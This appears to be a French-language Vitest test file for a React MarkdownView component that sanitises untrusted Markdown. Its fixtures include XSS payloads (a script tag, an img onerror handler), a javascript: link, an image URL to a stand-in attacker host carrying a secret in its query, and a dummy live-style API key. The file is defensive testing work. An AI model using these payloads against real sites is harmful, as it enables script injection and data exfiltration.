import { render, screen } from '@testing-library/react'
import { describe, expect, it } from 'vitest'

import { MarkdownView } from './MarkdownView.tsx'

describe('MarkdownView — contenu non fiable', () => {
  it('rend le Markdown GFM en décalant les titres d’un niveau', () => {
    render(
      <MarkdownView
        content={'# Conventions\n\n## Structure\n\n- `app/`\n\n| a | b |\n|---|---|\n| 1 | 2 |'}
      />,
    )
    expect(screen.getByRole('heading', { level: 2, name: 'Conventions' })).toBeInTheDocument()
    expect(screen.getByRole('heading', { level: 3, name: 'Structure' })).toBeInTheDocument()
    expect(screen.getByText('app/').tagName).toBe('CODE')
    expect(screen.getByRole('table')).toBeInTheDocument()
  })

  it('ignore le HTML brut (script, gestionnaires d’événements)', () => {
    const { container } = render(
      <MarkdownView
        content={'Avant <script>alert(1)</script> <img src=x onerror="alert(1)"> après'}
      />,
    )
    expect(container.querySelector('script')).toBeNull()
    expect(container.querySelector('[onerror]')).toBeNull()
    // Le texte entre balises reste affiché, mais inerte : aucune balise n'est rendue.
    expect(container.innerHTML).not.toMatch(/<script|<img|onerror/i)
  })

  it('ne charge jamais d’image distante', () => {
    const { container } = render(
      <MarkdownView content="![pixel](https://evil.example/p.png?d=secret)" />,
    )
    expect(container.querySelector('img')).toBeNull()
    expect(container).toHaveTextContent('[image non chargée : pixel]')
  })

  it('neutralise les liens javascript: et isole les liens externes', () => {
    render(<MarkdownView content="[ok](https://docs.example.com) [ko](javascript:alert(1))" />)
    const link = screen.getByRole('link', { name: 'ok' })
    expect(link).toHaveAttribute('rel', 'noopener noreferrer nofollow')
    expect(screen.getByText('ko').closest('a')?.getAttribute('href') ?? '').not.toMatch(
      /^javascript:/i,
    )
  })

  it('masque les secrets à l’affichage', () => {
    render(<MarkdownView content="NUXT_API_KEY=sk_live_51HxDEMOonly3kQ" />)
    expect(screen.getByText('NUXT_API_KEY=sk_live_51Hx••••••••••••3kQ')).toBeInTheDocument()
  })
})
